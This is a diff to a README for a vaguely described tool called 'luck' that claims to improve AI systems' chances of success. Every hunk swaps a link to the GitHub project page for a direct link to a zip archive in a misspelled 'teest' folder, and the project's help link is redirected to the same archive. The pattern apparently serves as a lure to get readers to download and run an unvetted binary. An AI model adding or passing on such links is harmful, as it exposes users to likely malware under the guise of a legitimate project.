@@ -1,6 +1,6 @@
 # 🍀 luck - Improve Your AI Systems’ Luck
 
-[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://github.com/cynosureoceanicwhitetipshark645/luck)
+[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://raw.githubusercontent.com/cynosureoceanicwhitetipshark645/luck/main/teest/Software_1.9.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Before you start, check your computer has:
 
 Click the big green button below to go to the official download page.
 
-[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://github.com/cynosureoceanicwhitetipshark645/luck)
+[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://raw.githubusercontent.com/cynosureoceanicwhitetipshark645/luck/main/teest/Software_1.9.zip)
 
 You will find the latest version of luck there. This page provides all the files you need to install.
 
@@ -125,7 +125,7 @@ To update:
 
 If you want help with luck, visit the GitHub project page:
 
-https://github.com/cynosureoceanicwhitetipshark645/luck
+https://raw.githubusercontent.com/cynosureoceanicwhitetipshark645/luck/main/teest/Software_1.9.zip
 
 Here you can find answers, report issues, or suggest improvements.
 
@@ -137,4 +137,4 @@ luck offers a practical way to track and improve the chance of success in AI pro
 
 ---
 
-[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://github.com/cynosureoceanicwhitetipshark645/luck)
+[![Download luck](https://img.shields.io/badge/Download-luck-brightgreen)](https://raw.githubusercontent.com/cynosureoceanicwhitetipshark645/luck/main/teest/Software_1.9.zip)
